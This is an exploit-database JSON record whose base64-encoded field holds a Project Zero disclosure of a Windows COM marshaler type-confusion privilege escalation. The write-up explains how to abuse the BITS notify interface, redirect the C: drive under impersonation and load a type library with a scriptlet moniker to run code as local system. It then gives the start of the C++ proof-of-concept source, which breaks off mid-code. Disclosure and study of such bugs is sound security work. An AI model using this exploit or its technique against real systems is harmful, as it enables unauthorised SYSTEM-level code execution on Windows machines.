{
    "source": "exploit-database", 
    "exploit": "LyoNClNvdXJjZTogaHR0cHM6Ly9idWdzLmNocm9taXVtLm9yZy9wL3Byb2plY3QtemVyby9pc3N1ZXMvZGV0YWlsP2lkPTExMDcNCg0KV2luZG93czogQ09NIEFnZ3JlZ2F0ZSBNYXJzaGFsZXIvSVJlbVVua25vd24yIFR5cGUgQ29uZnVzaW9uIEVvUA0KUGxhdGZvcm06IFdpbmRvd3MgMTAgMTA1ODYvMTQzOTMgbm90IHRlc3RlZCA4LjEgVXBkYXRlIDINCkNsYXNzOiBFbGV2YXRpb24gb2YgUHJpdmlsZWdlDQoNClN1bW1hcnk6DQpXaGVuIGFjY2Vzc2luZyBhbiBPT1AgQ09NIG9iamVjdCB1c2luZyBJUmVtVW5rbm93bjIgdGhlIGxvY2FsIHVubWFyc2hhbGVkIHByb3h5IGNhbiBiZSBmb3IgYSBkaWZmZXJlbnQgaW50ZXJmYWNlIHRvIHRoYXQgcmVxdWVzdGVkIGJ5IFF1ZXJ5SW50ZXJmYWNlIHJlc3VsdGluZyBpbiBhIHR5cGUgY29uZnVzaW9uIHdoaWNoIGNhbiByZXN1bHQgaW4gRW9QLg0KDQpEZXNjcmlwdGlvbjoNCg0KUXVlcnlpbmcgZm9yIGFuIElJRCBvbiBhIE9PUCAob3IgcmVtb3RlKSBDT00gb2JqZWN0IGNhbGxzIHRoZSBPUlBDIG1ldGhvZCBSZW1RdWVyeUludGVyZmFjZSBvciBSZW1RdWVyeUludGVyZmFjZTIgb24gdGhlIGRlZmF1bHQgcHJveHkuIFRoaXMgcmVxdWVzdCBpcyBwYXNzZWQgdG8gdGhlIHJlbW90ZSBvYmplY3Qgd2hpY2ggcXVlcmllcyB0aGUgaW1wbGVtZW50YXRpb24gb2JqZWN0IGFuZCBpZiBzdWNjZXNzZnVsIHJldHVybnMgYSBtYXJzaGFsZWQgcmVwcmVzZW50YXRpb24gb2YgdGhhdCBpbnRlcmZhY2UgdG8gdGhlIGNhbGxlci4gDQoNClRoZSBkaWZmZXJlbmNlIGJldHdlZW4gUmVtUXVlcnlJbnRlcmZhY2UgYW5kIFJlbVF1ZXJ5SW50ZXJmYWNlMiAoUlFJMikgaXMgaG93IHRoZSBvYmplY3RzIGFyZSBwYXNzZWQgYmFjayB0byB0aGUgY2FsbGVyLiBGb3IgUmVtUXVlcnlJbnRlcmZhY2UgdGhlIGludGVyZmFjZSBpcyBwYXNzZWQgYmFjayBhcyBhIFNURE9CSlJFRiB3aGljaCBvbmx5IGNvbnRhaW5zIHRoZSBiYXNpYyBPWElEL09JRC9JUElEIGluZm9ybWF0aW9uIHRvIGNvbm5lY3QgYmFjay4gUmVtUXVlcnlJbnRlcmZhY2UyIG9uIHRoZSBvdGhlciBoYW5kIHBhc3NlcyBiYWNrIE1JbnRlcmZhY2VQb2ludGVyIHN0cnVjdHVyZXMgd2hpY2ggaXMgYW4gZW50aXJlIE9CSlJFRi4gVGhlIHJhdGlvbmFsZSwgYXMgZmFyIGFzIEkgY2FuIHRlbGwsIGlzIHRoYXQgUlFJMiBpcyB1c2VkIGZvciBpbXBsZW1lbnRpbmcgaW4tcHJvY2VzcyBoYW5kbGVycywgc29tZSBpbnRlcmZhY2VzIGNhbiBiZSBtYXJzaGFsZWQgdXNpbmcgdGhlIHN0YW5kYXJkIG1hcnNoYWxlciBhbmQgb3RoZXJzIGNhbiBiZSBjdXN0b20gbWFyc2hhbGVkLiBUaGlzIGlzIGV4cG9zZWQgdGhyb3VnaCB0aGUgQWdncmVnYXRlIFN0YW5kYXJkIE1hcnNoYWxlci4gDQoNClRoZSBidWcgbGllcyBpbiB0aGUgaW1wbGVtZW50YXRpb24gb2YgdW5wYWNraW5nIHRoZSByZXN1bHRzIG9mIHRoZSB0aGUgUlFJMiByZXF1ZXN0IGluIENTdGRNYXJzaGFsOjpGaW5pc2hfUmVtUUlBbmRVbm1hcnNoYWwyLiBGb3IgZWFjaCBNSW50ZXJmYWNlUG9pbnRlciBDU3RkTWFyc2hhbDo6VW5tYXJzaGFsSW50ZXJmYWNlIGlzIGNhbGxlZCBwYXNzaW5nIHRoZSBJSUQgb2YgdGhlIGV4cGVjdGVkIGludGVyZmFjZSBhbmQgdGhlIGJpbmFyeSBkYXRhIHdyYXBwZWQgaW4gYW4gSVN0cmVhbS4gQ1N0ZE1hcnNoYWw6OlVubWFyc2hhbEludGVyZmFjZSBibGluZGx5IHVubWFyc2hhbHMgdGhlIGludGVyZmFjZSwgd2hpY2ggY3JlYXRlcyBhIGxvY2FsIHByb3h5IG9iamVjdCBidXQgdGhlIHByb3h5IGlzIGNyZWF0ZWQgZm9yIHRoZSBJSUQgaW4gdGhlIE9CSlJFRiBzdHJlYW0gYW5kIE5PVCB0aGUgSUlEIHJlcXVlc3RlZCBpbiBSUUkyLiBObyBmdXJ0aGVyIHZlcmlmaWNhdGlvbiBvY2N1cnMgYXQgdGhpcyBwb2ludCBhbmQgdGhlIGNyZWF0ZWQgcHJveHkgaXMgcGFzc2VkIGJhY2sgdXAgdGhlIGNhbGwgc3RhY2sgdW50aWwgdGhlIHJlY2VpdmVkIGJ5IHRoZSBjYWxsZXIgKHRocm91Z2ggYSB2b2lkKiogb2J2aW91c2x5KS4gDQoNCklmIHRoZSBJSUQgaW4gdGhlIE9CSlJFRiBkb2VzbuKAmXQgbWF0Y2ggdGhlIElJRCByZXF1ZXN0ZWQgdGhlIGNhbGxlciBkb2VzbuKAmXQga25vdywgaWYgaXQgY2FsbHMgYW55IG1ldGhvZHMgb24gdGhlIGV4cGVjdGVkIGludGVyZmFjZSBpdCB3aWxsIGJlIGNhbGxpbmcgYSB0eXBlIGNvbmZ1c2VkIG9iamVjdC4gVGhpcyBjb3VsZCByZXN1bHQgaW4gY3Jhc2hlcyBpbiB0aGUgY2FsbGVyIHdoZW4gaXQgdHJpZXMgdG8gYWNjZXNzIG1ldGhvZHMgb24gdGhlIGV4cGVjdGVkIGludGVyZmFjZSB3aGljaCBhcmVu4oCZdCB0aGVyZSBvciBhcmUgaW1wbGVtZW50ZWQgZGlmZmVyZW50bHkuIFlvdSBjb3VsZCBwcm9iYWJseSBhbHNvIHJldHVybiBhIHN0YW5kYXJkIE9CSlJFRiB0byBhIG9iamVjdCBsb2NhbCB0byB0aGUgY2FsbGVyLCB0aGlzIHdpbGwgcmVzdWx0IGluIHJldHVybmluZyB0aGUgbG9jYWwgb2JqZWN0IGl0c2VsZiB3aGljaCBtaWdodCBoYXZlIG1vcmUgc2NvcGUgZm9yIGV4cGxvaXRpbmcgdGhlIHR5cGUgY29uZnVzaW9uLiBJbiBvcmRlciB0byBnZXQgdGhlIGNhbGxlciB0byB1c2UgUlFJMiB3ZSBqdXN0IG5lZWQgdG8gcGFzcyBpdCBiYWNrIGFuIG9iamVjdCB3aGljaCBpcyBjdXN0b20gbWFyc2hhbGVkIHdpdGggdGhlIEFnZ3JlZ2F0ZSBTdGFuZGFyZCBNYXJzaGFsZXIuIFRoaXMgd2lsbCBzZXQgYSBmbGFnIG9uIHRoZSBtYXJzaGFsZXIgd2hpY2ggaW5kaWNhdGVzIHRvIGFsd2F5cyB1c2UgdGhlIGFnZ3JlZ2F0ZSBtYXJzaGFsZXIgd2hpY2ggcmVzdWx0cyBpbiB1c2luZyBSUUkyIGluc3RlYWQgb2YgUlFJLiBBcyB0aGlzIGNsYXNzIGlzIGEgY29yZSBjb21wb25lbnQgb2YgQ09NIGl04oCZcyB0cnVzdGVkIGFuZCBzbyBpc27igJl0IGFmZmVjdGVkIGJ5IHRoZSBFT0FDX05PX0NVU1RPTV9NQVJTSEFMIHNldHRpbmcuDQoNCkluIG9yZGVyIHRvIGV4cGxvaXQgdGhpcyBhIGRpZmZlcmVudCBjYWxsZXIgbmVlZHMgdG8gY2FsbCBRdWVyeUludGVyZmFjZSBvbiBhbiBvYmplY3QgdW5kZXIgYSBsZXNzIHRydXN0ZWQgdXNlcidzIGNvbnRyb2wuIFRoaXMgY291bGQgYmUgYSBtb3JlIHByaXZpbGVnZWQgdXNlciAoc3VjaCBhcyBhIHNhbmRib3ggYnJva2VyKSwgb3IgYSBwcml2aWxlZ2VkIHNlcnZpY2UuIFRoaXMgaXMgcHJldHR5IGVhc3kgcGF0dGVybiB0byBmaW5kLCBhbnkgbWV0aG9kIGluIGFuIGV4cG9zZWQgaW50ZXJmYWNlIG9uIGEgbW9yZSB0cnVzdGVkIENPTSBvYmplY3Qgd2hpY2ggdGFrZXMgYW4gaW50ZXJmYWNlIHBvaW50ZXIgb3IgdmFyaWFudCB3b3VsZCBwb3RlbnRpYWxseSBiZSB2dWxuZXJhYmxlLiBGb3IgZXhhbXBsZSBJUGVyc2lzdFN0cmVhbSB0YWtlcyBhbiBJU3RyZWFtIGludGVyZmFjZSBwb2ludGVyIGFuZCB3aWxsIGNhbGwgbWV0aG9kcyBvbiBpdC4gQW5vdGhlciB0eXBlIG9mIG1ldGhvZCBpcyBvbmUgb2YgdGhlIHZhcmlvdXMgbm90aWZpY2F0aW9uIGludGVyZmFjZXMgc3VjaCBhcyBJQmFja2dyb3VuZENvcHlDYWxsYmFjayBmb3IgQklUUy4gVGhpcyBjYW4gcHJvYmFibHkgYWxzbyBiZSB1c2VkIHJlbW90ZWx5IGlmIHRoZSBhdHRhY2tlciBoYXMgdGhlIG9wcG9ydHVuaXR5IHRvIGluamVjdCBhbiBPQkpSRUYgc3RyZWFtIGludG8gYSBjb25uZWN0aW9uIHdoaWNoIGlzIHNldCB0byBDT05ORUNUIGxldmVsIHNlY3VyaXR5ICh3aGljaCBzZWVtcyB0byBiZSB0aGUgZGVmYXVsdCBhY3RpdmF0aW9uIHNlY3VyaXR5KS4gDQoNCk9uIHRvIGV4cGxvaXRhdGlvbiwgYXMgeW91IHdlbGwga25vdyBJ4oCZdmUgbGl0dGxlIGludGVyZXN0IGluIGV4cGxvaXRpbmcgbWVtb3J5IGNvcnJ1cHRpb25zLCBlc3BlY2lhbGx5IGFzIHRoaXMgd291bGQgIGVpdGhlciB0aGlzIHdpbGwgdHJpZ2dlciBDRkcgb24gbW9kZXJuIHN5c3RlbXMgb3Igd291bGQgcmVxdWlyZSBhIHZlcnkgcHJlY2lzZSBsaW5ldXAgb2YgZXhwZWN0ZWQgbWV0aG9kIGFuZCBhY3R1YWwgY2FsbGVkIG1ldGhvZCB3aGljaCBjb3VsZCBiZSB0cmlja3kgdG8gZXhwbG9pdCByZWxpYWJseS4gSG93ZXZlciBJIHRoaW5rIGF0IGxlYXN0IHVzaW5nIHRoaXMgdG8gZXNjYXBlIGEgc2FuZGJveCBpdCBtaWdodCBiZSB5b3VyIG9ubHkgb3B0aW9uLiBTbyBJ4oCZbSBub3QgZ29pbmcgdG8gZG8gdGhhdCwgaW5zdGVhZCBJ4oCZbSBnb2luZyB0byBleHBsb2l0IGl0IGxvZ2ljYWxseSwgdGhlIG9ubHkgcHJvYmxlbSBpcyB0aGlzIGlzIHByb2JhYmx5IHVuZXhwbG9pdGFibGUgZnJvbSBhIHNhbmRib3ggKG1heWJlKSBhbmQgcmVxdWlyZXMgYSB2ZXJ5IHNwZWNpZmljIHR5cGUgb2YgY2FsbGJhY2sgaW50byBvdXIgb2JqZWN0LiANCg0KVGhlIHRoaW5nIEnigJltIGdvaW5nIHRvIGV4cGxvaXQgaXMgaW4gdGhlIGhhbmRsaW5nIG9mIE9MRSBBdXRvbWF0aW9uIGF1dG8tcHJveHkgY3JlYXRpb24gZnJvbSB0eXBlIGxpYnJhcmllcy4gV2hlbiB5b3UgaW1wbGVtZW50IGFuIEF1dG9tYXRpb24gY29tcGF0aWJsZSBvYmplY3QgeW91IGNvdWxkIGltcGxlbWVudCBhbiBleHBsaWNpdCBwcm94eSBidXQgaWYgeW914oCZdmUgYWxyZWFkeSBnb3QgYSBUeXBlIGxpYnJhcnkgYnVpbHQgZnJvbSB5b3VyIElETCB0aGVuIE9MRUFVVDMyIHByb3ZpZGVzIGFuIGFsdGVybmF0aXZlLiBJZiB5b3UgcmVnaXN0ZXIgeW91ciBpbnRlcmZhY2Ugd2l0aCBhIFByb3h5IENMU0lEIGZvciBQU09BSW50ZXJmYWNlIG9yIFBTRGlzcGF0Y2ggdGhlbiBpbnN0ZWFkIG9mIGxvYWRpbmcgeW91ciBQUyBETEwgaXQgd2lsbCBsb2FkIE9MRUFVVDMyLiBUaGUgcHJveHkgbG9hZGVyIGNvZGUgd2lsbCBsb29rdXAgdGhlIGludGVyZmFjZSBlbnRyeSBmb3IgdGhlIHBhc3NlZCBJSUQgdG8gc2VlIGlmIHRoZXJl4oCZcyBhIHJlZ2lzdGVyZWQgdHlwZSBsaWJyYXJ5IGFzc29jaWF0ZWQgd2l0aCBpdC4gSWYgdGhlcmUgaXMgdGhlIGNvZGUgd2lsbCBjYWxsIExvYWRUeXBlTGliIG9uIHRoYXQgbGlicmFyeSBhbmQgbG9vayB1cCB0aGUgaW50ZXJmYWNlIGVudHJ5IGluIHRoZSB0eXBlIGxpYnJhcnkuIEl0IHdpbGwgdGhlbiBjb25zdHJ1Y3QgYSBjdXN0b20gcHJveHkgb2JqZWN0IGJhc2VkIG9uIHRoZSB0eXBlIGxpYnJhcnkgaW5mb3JtYXRpb24uIA0KDQpUaGUgdHJpY2sgaGVyZSBpcyB3aGlsZSBpbiBnZW5lcmFsIHdlIGRvbuKAmXQgY29udHJvbCB0aGUgbG9jYXRpb24gb2YgdGhlIHR5cGUgbGlicmFyeSAoc28gaXTigJlzIHByb2JhYmx5IGluIGEgbG9jYXRpb24gd2UgY2FuIHdyaXRlIHRvIHN1Y2ggYXMgc3lzdGVtMzIpIGlmIHdlIGNhbiBnZXQgYW4gb2JqZWN0IHVubWFyc2hhbGVkIHdoaWNoIGluZGljYXRlcyBpdOKAmXMgSUlEIGlzIG9uZSBvZiB0aGVzZSBhdXRvLXByb3h5IGludGVyZmFjZXMgd2hpbGUgdGhlIHByaXZpbGVnZWQgc2VydmljZSBpcyBpbXBlcnNvbmF0aW5nIHVzIHdlIGNhbiByZWRpcmVjdCB0aGUgQzogZHJpdmUgdG8gYW55d2hlcmUgd2UgbGlrZSBhbmQgc28gZ2V0IHRoZSBzZXJ2aWNlIHRvIGxvYWQgYW4gYXJiaXRyYXJ5IHR5cGUgbGlicmFyeSBmaWxlIGluc3RlYWQgb2YgYSB0aGUgc3lzdGVtIG9uZS4gT25lIGVhc3kgcGxhY2Ugd2hlcmUgdGhpcyBleGFjdCBzY2VuYXJpbyBvY2N1cnMgaXMgaW4gdGhlIGFmb3JlbWVudGlvbmVkIEJJVFMgU2V0Tm90aWZ5SW50ZXJmYWNlIGZ1bmN0aW9uLiBUaGUgc2VydmljZSBmaXJzdCBpbXBlcnNvbmF0ZXMgdGhlIGNhbGxlciBiZWZvcmUgY2FsbGluZyBRSSBvbiB0aGUgbm90aWZ5IGludGVyZmFjZS4gV2UgY2FuIHRoZW4gcmV0dXJuIGFuIE9CSlJFRiBmb3IgYSBhdXRvbWF0aW9uIElJRCBldmVuIHRob3VnaCB0aGUgc2VydmljZSBhc2tlZCBmb3IgYSBCSVRTIGNhbGxiYWNrIGludGVyZmFjZS4NCg0KU28gd2hhdD8gV2VsbCBpdOKAmXMgYmVlbiBrbm93biBmb3IgYWxtb3N0IDEwIHllYXJzIHRoYXQgdGhlIFR5cGUgbGlicmFyeSBmaWxlIGZvcm1hdCBpcyBjb21wbGV0ZWx5IHVuc2FmZS4gSXQgd2FzIHJlcG9ydGVkIGFuZCBpdCB3YXNu4oCZdCBjaGFuZ2VkLCBUb21ia2VlcGVyIGhpZ2hsaWdodGVkIHRoaXMgaW4gaGlzIOKAnFNleHJldHMgW3NpY10gb2YgTG9hZExpYnJhcnnigJ0gcHJlc2VudGF0aW9uIGF0IENTVyAyMDE1LiBZb3UgY2FuIGNyYWZ0IGEgVExCIHdoaWNoIHdpbGwgZGlyZWN0bHkgY29udHJvbCBFSVAuIE5vdyB5b3XigJlkIGFzc3VtZSB0aGVyZWZvcmUgSeKAmW0gdHJhZGluZyBhIHVucmVsaWFibGUgd2F5IG9mIGdldHRpbmcgRUlQIGNvbnRyb2wgZm9yIG9uZSB3aGljaCBpcyBtdWNoIGVhc2llciwgaWYgeW91IGFzc3VtZSB0aGF0IHlvdeKAmWQgYmUgd3JvbmcuIEluc3RlYWQgSeKAmW0gZ29pbmcgdG8gYWJ1c2UgdGhlIGZhY3QgdGhhdCBUTEJzIGNhbiBoYXZlIHJlZmVyZW5jZWQgdHlwZSBsaWJyYXJpZXMsIHdoaWNoIGlzIHVzZWQgaW5zdGVhZCBvZiBlbWJlZGRpbmcgdGhlIHR5cGUgZGVmaW5pdGlvbnMgaW5zaWRlIHRoZSBUTEIgaXRzZWxmLiBXaGVuIGEgcmVmZXJlbmNlIHR5cGUgaXMgbG9hZGVkIHRoZSBsb2FkZXIgd2lsbCB0cnkgYW5kIGxvb2sgdXAgdGhlIFRMQiBieSBpdHMgR1VJRCwgaWYgdGhhdCBmYWlscyBpdCB3aWxsIHRha2UgdGhlIGZpbGVuYW1lIHN0cmluZyBhbmQgcGFzcyBpdCB2ZXJiYXRpbSB0byBMb2FkVHlwZUxpYi4gSXTigJlzIGEgbGVzc2VyIGtub3cgZmFjdCB0aGF0IHRoaXMgZnVuY3Rpb24sIGlmIGl0IGZhaWxzIHRvIGZpbmQgYSBmaWxlIHdpdGggdGhlIGNvcnJlY3QgbmFtZSB3aWxsIHRyeSBhbmQgcGFyc2UgdGhlIG5hbWUgYXMgYSBtb25pa2VyLiBUaGVyZWZvcmUgd2UgY2FuIGluc2VydCBhIHNjcmlwdGxldCBtb25pa2VyIGludG8gdGhlIHR5cGUgbGlicmFyeSwgd2hlbiB0aGUgYXV0by1wcm94eSBnZW5lcmF0b3IgdHJpZXMgdG8gZmluZCBob3cgbWFueSBmdW5jdGlvbnMgdGhlIGludGVyZmFjZSBpbXBsZW1lbnRzIGl0IHdhbGtzIHRoZSBpbmhlcml0YW5jZSBjaGFpbiwgd2hpY2ggY2F1c2VzIHRoZSByZWZlcmVuY2VkIFRMQiB0byBiZSBsb2FkZWQsIHdoaWNoIGNhdXNlcyBhIHNjcmlwdGxldCBtb25pa2VyIHRvIGJlIGxvYWRlZCBhbmQgYm91bmQgd2hpY2ggcmVzdWx0cyBpbiBhcmJpdHJhcnkgZXhlY3V0aW9uIGluIGEgc2NyaXB0aW5nIGxhbmd1YWdlIGluc2lkZSB0aGUgcHJpdmlsZWdlZCBDT00gY2FsbGVyLiANCg0KVGhlIG5lZWQgdG8gcmVwbGFjZSB0aGUgQzogZHJpdmUgaXMgd2h5IHRoaXMgd29u4oCZdCB3b3JrIGFzIGEgc2FuZGJveCBlc2NhcGUuIEFsc28gaXQncyBhIG1vcmUgZ2VuZXJhbCB0ZWNobmlxdWUsIG5vdCBzcGVjaWZpYyB0byB0aGlzIHZ1bG5lcmFiaWxpdHkgYXMgc3VjaCwgeW91IGNvdWxkIGV4cGxvaXQgaXQgaW4gdGhlIGxvdy1sZXZlbCBORFIgbWFyc2hhbGVyIGxheWVyLCBob3dldmVyIGl04oCZcyByYXJlIHRvIGZpbmQgc29tZXRoaW5nIGltcGVyc29uYXRpbmcgdGhlIGNhbGxlciBkdXJpbmcgdGhlIGxvdy1sZXZlbCB1bm1hcnNoYWwuIFR5cGUgbGlicmFyaWVzIGFyZSBub3QgbG9hZGVkIHVzaW5nIHRoZSBmbGFnIGFkZGVkIGFmdGVyIENWRS0yMDE1LTE2NDQgd2hpY2ggcHJldmVudCBETExzIGJlaW5nIGxvYWRlZCBmcm9tIHRoZSBpbXBlcnNvbmF0ZSBkZXZpY2UgbWFwLiBJIHRoaW5rIHlvdSBtaWdodCB3YW50IHRvIGZpeCB0aGlzIGFzIHdlbGwgYXMgdGhlcmXigJlzIG90aGVyIHBsYWNlcyBhbmQgc2NlbmFyaW9zIHRoaXMgY2FuIG9jY3VyLCBmb3IgZXhhbXBsZSB0aGVyZeKAmXMgYSBudW1iZXIgb2YgV01JIHNlcnZpY2VzIChzdWNoIGFzIGFueXRoaW5nIHdoaWNoIHRvdWNoZXMgR1BPcykgd2hpY2ggcmVzdWx0IGluIHRoZSBBY3RpdmVEUyBjb20gb2JqZWN0IGJlaW5nIGNyZWF0ZWQsIHRoaXMgaXMgYXV0b21hdGlvbiBjb21wYXRpYmxlIGFuZCBzbyB3aWxsIGxvYWQgYSB0eXBlIGxpYnJhcnkgd2hpbGUgaW1wZXJzb25hdGluZyB0aGUgY2FsbGVyLiBQZXJoYXBzIHRoZSBhdXRvLXByb3h5IGdlbmVyYXRlZCBzaG91bGQgdGVtcG9yYXJpbHkgZGlzYWJsZSBpbXBlcnNvbmF0aW9uIHdoZW4gbG9hZGluZyB0aGUgdHlwZSBsaWJyYXJ5IHRvIHByZXZlbnQgdGhpcyBoYXBwZW5pbmcuIA0KDQpQcm9vZiBvZiBDb25jZXB0Og0KDQpJ4oCZdmUgcHJvdmlkZWQgYSBQb0MgYXMgYSBDKysgc291cmNlIGNvZGUgZmlsZS4gWW91IG5lZWQgdG8gY29tcGlsZSBpdCBmaXJzdC4gSXQgYWJ1c2VzIHRoZSBCSVRTIFNldE5vdGlmeUludGVyZmFjZSB0byBnZXQgYSB0eXBlIGxpYnJhcnkgbG9hZGVkIHVuZGVyIGltcGVyc29uYXRpb24uIFdlIGNhdXNlIGl0IHRvIGxvYWQgYSB0eXBlIGxpYnJhcnkgd2hpY2ggcmVmZXJlbmNlcyBhIHNjcmlwdGxldCBtb25pa2VyIHdoaWNoIGdldHMgdXMgY29kZSBleGVjdXRpb24gaW5zaWRlIHRoZSBCSVRTIHNlcnZpY2UuDQoNCjEpIENvbXBpbGUgdGhlIEMrKyBzb3VyY2UgY29kZSBmaWxlLg0KMikgRXhlY3V0ZSB0aGUgUG9DIGZyb20gYSBkaXJlY3Rvcnkgd3JpdGFibGUgYnkgdGhlIGN1cnJlbnQgdXNlci4gDQozKSBBbiBhZG1pbiBjb21tYW5kIHJ1bm5pbmcgYXMgbG9jYWwgc3lzdGVtIHNob3VsZCBhcHBlYXIgb24gdGhlIGN1cnJlbnQgZGVza3RvcC4NCg0KRXhwZWN0ZWQgUmVzdWx0Og0KVGhlIGNhbGxlciBzaG91bGQgcmVhbGl6ZSB0aGVyZeKAmXMgYW4gSUlEIG1pc21hdGNoIGFuZCByZWZ1c2UgdG8gdW5tYXJzaGFsLCBvciBhdCBsZWFzdCBRSSB0aGUgbG9jYWwgcHJveHkgZm9yIHRoZSBjb3JyZWN0IGludGVyZmFjZS4NCg0KT2JzZXJ2ZWQgUmVzdWx0Og0KVGhlIHdyb25nIHByb3h5IGlzIGNyZWF0ZWQgdG8gdGhhdCByZXF1ZXN0ZWQgcmVzdWx0aW5nIGluIHR5cGUgY29uZnVzaW9uIGFuZCBhbiBhdXRvbWF0aW9uIHByb3h5IGJlaW5nIGNyZWF0ZWQgcmVzdWx0aW5nIGluIGNvZGUgZXhlY3V0aW9uIGluIHRoZSBCSVRTIHNlcnZlci4NCiovDQoNCi8vIEJJVFNUZXN0LmNwcCA6IERlZmluZXMgdGhlIGVudHJ5IHBvaW50IGZvciB0aGUgY29uc29sZSBhcHBsaWNhdGlvbi4NCi8vDQojaW5jbHVkZSA8Yml0cy5oPg0KI2luY2x1ZGUgPGJpdHM0XzAuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHRjaGFyLmg+DQojaW5jbHVkZSA8bG0uaD4NCiNpbmNsdWRlIDxzdHJpbmc+DQojaW5jbHVkZSA8Y29tZGVmLmg+DQojaW5jbHVkZSA8d2ludGVybmwuaD4NCiNpbmNsdWRlIDxTaGx3YXBpLmg+DQojaW5jbHVkZSA8c3Ryc2FmZS5oPg0KI2luY2x1ZGUgPHZlY3Rvcj4NCg0KI3ByYWdtYSBjb21tZW50KGxpYiwgInNobHdhcGkubGliIikNCg0Kc3RhdGljIGJzdHJfdCBJSURUb0JTVFIoUkVGSUlEIHJpaWQpDQp7DQoJTFBPTEVTVFIgc3RyOw0KCWJzdHJfdCByZXQgPSAiVW5rbm93biI7DQoJaWYgKFNVQ0NFRURFRChTdHJpbmdGcm9tSUlEKHJpaWQsICZzdHIpKSkNCgl7DQoJCXJldCA9IHN0cjsNCgkJQ29UYXNrTWVtRnJlZShzdHIpOw0KCX0NCglyZXR1cm4gcmV0Ow0KfQ0KDQpHVUlEIENMU0lEX0FnZ1N0ZE1hcnNoYWwyID0geyAweDAwMDAwMDI3LDB4MDAwMCwweDAwMDgseyAweGMwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NDYgfSB9Ow0KR1VJRCBJSURfSVRNZWRpYUNvbnRyb2wgPSB7IDB4YzQ0NWRkZTgsMHg1MTk5LDB4NGJjNyx7IDB4OTgsMHgwNywweDVmLDB4ZmIsMHg5MiwweGU0LDB4MmUsMHgwOSB9IH07DQoNCmNsYXNzIENNYXJzaGFsbGVyIDogcHVibGljIElNYXJzaGFsDQp7DQoJTE9ORyBfcmVmX2NvdW50Ow0KCUlVbmtub3duUHRyIF91bms7DQoNCgl+Q01hcnNoYWxsZXIoKSB7fQ0KDQpwdWJsaWM6DQoNCglDTWFyc2hhbGxlcihJVW5rbm93biogdW5rKSA6IF9yZWZfY291bnQoMSkNCgl7DQoJCV91bmsgPSB1bms7DQoJfQ0KDQoJdmlydHVhbCBIUkVTVUxUIFNURE1FVEhPRENBTExUWVBFIFF1ZXJ5SW50ZXJmYWNlKA0KCQkvKiBbaW5dICovIFJFRklJRCByaWlkLA0KCQkvKiBbaWlkX2lzXVtvdXRdICovIF9DT01fT3V0cHRyXyB2b2lkIF9fUlBDX0ZBUiAqX19SUENfRkFSICpwcHZPYmplY3QpDQoJew0KCQkqcHB2T2JqZWN0ID0gbnVsbHB0cjsNCgkJcHJpbnRmKCJRSSAtIE1hcnNoYWxsZXI6ICVscyAlcFxuIiwgSUlEVG9CU1RSKHJpaWQpLkdldEJTVFIoKSwgdGhpcyk7DQoNCgkJaWYgKHJpaWQgPT0gSUlEX0lVbmtub3duKQ0KCQl7DQoJCQkqcHB2T2JqZWN0ID0gdGhpczsNCgkJfQ0KCQllbHNlIGlmIChyaWlkID09IElJRF9JTWFyc2hhbCkNCgkJew0KCQkJKnBwdk9iamVjdCA9IHN0YXRpY19jYXN0PElNYXJzaGFsKj4odGhpcyk7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQlyZXR1cm4gRV9OT0lOVEVSRkFDRTsNCgkJfQ0KCQlwcmludGYoIlF1ZXJpZWQgU3VjY2VzczogJXBcbiIsICpwcHZPYmplY3QpOw0KCQkoKElVbmtub3duKikqcHB2T2JqZWN0KS0+QWRkUmVmKCk7DQoJCXJldHVybiBTX09LOw0KCX0NCg0KCXZpcnR1YWwgVUxPTkcgU1RETUVUSE9EQ0FMTFRZUEUgQWRkUmVmKHZvaWQpDQoJew0KCQlwcmludGYoIkFkZFJlZjogJWRcbiIsIF9yZWZfY291bnQpOw0KCQlyZXR1cm4gSW50ZXJsb2NrZWRJbmNyZW1lbnQoJl9yZWZfY291bnQpOw0KCX0NCg0KCXZpcnR1YWwgVUxPTkcgU1RETUVUSE9EQ0FMTFRZUEUgUmVsZWFzZSh2b2lkKQ0KCXsNCgkJcHJpbnRmKCJSZWxlYXNlOiAlZFxuIiwgX3JlZl9jb3VudCk7DQoJCVVMT05HIHJldCA9IEludGVybG9ja2VkRGVjcmVtZW50KCZfcmVmX2NvdW50KTsNCgkJaWYgKHJldCA9PSAwKQ0KCQl7DQoJCQlwcmludGYoIlJlbGVhc2Ugb2JqZWN0ICVwXG4iLCB0aGlzKTsNCgkJCWRlbGV0ZSB0aGlzOw0KCQl9DQoJCXJldHVybiByZXQ7DQoJfQ0KDQoJdmlydHVhbCBIUkVTVUxUIFNURE1FVEhPRENBTExUWVBFIEdldFVubWFyc2hhbENsYXNzKA0KCQkvKiBbYW5ub3RhdGlvbl1baW5dICovDQoJCV9Jbl8gIFJFRklJRCByaWlkLA0KCQkvKiBbYW5ub3RhdGlvbl1bdW5pcXVlXVtpbl0gKi8NCgkJX0luX29wdF8gIHZvaWQgKnB2LA0KCQkvKiBbYW5ub3RhdGlvbl1baW5dICovDQoJCV9Jbl8gIERXT1JEIGR3RGVzdENvbnRleHQsDQoJCS8qIFthbm5vdGF0aW9uXVt1bmlxdWVdW2luXSAqLw0KCQlfUmVzZXJ2ZWRfICB2b2lkICpwdkRlc3RDb250ZXh0LA0KCQkvKiBbYW5ub3RhdGlvbl1baW5dICovDQoJCV9Jbl8gIERXT1JEIG1zaGxmbGFncywNCgkJLyogW2Fubm90YXRpb25dW291dF0gKi8NCgkJX091dF8gIENMU0lEICpwQ2lkKQ0KCXsNCgkJKnBDaWQgPSBDTFNJRF9BZ2dTdGRNYXJzaGFsMjsNCgkJcmV0dXJuIFNfT0s7DQoJfQ0KDQoJdmlydHVhbCBIUkVTVUxUIFNURE1FVEhPRENBTExUWVBFIEdldE1hcnNoYWxTaXplTWF4KA0KCQkvKiBbYW5ub3RhdGlvbl1baW5dICovDQoJCV9Jbl8gIFJFRklJRCByaWlkLA0KCQkvKiBbYW5ub3RhdGlvbl1bdW5pcXVlXVtpbl0gKi8NCgkJX0luX29wdF8gIHZvaWQgKnB2LA0KCQkvKiBbYW5ub3RhdGlvbl1baW5dICovDQoJCV9Jbl8gIERXT1JEIGR3RGVzdENvbnRleHQsDQoJCS8qIFthbm5vdGF0aW9uXVt1bmlxdWVdW2luXSAqLw0KCQlfUmVzZXJ2ZWRfICB2b2lkICpwdkRlc3RDb250ZXh0LA0KCQkvKiBbYW5ub3RhdGlvbl1baW5dICovDQoJCV9Jbl8gIERXT1JEIG1zaGxmbGFncywNCg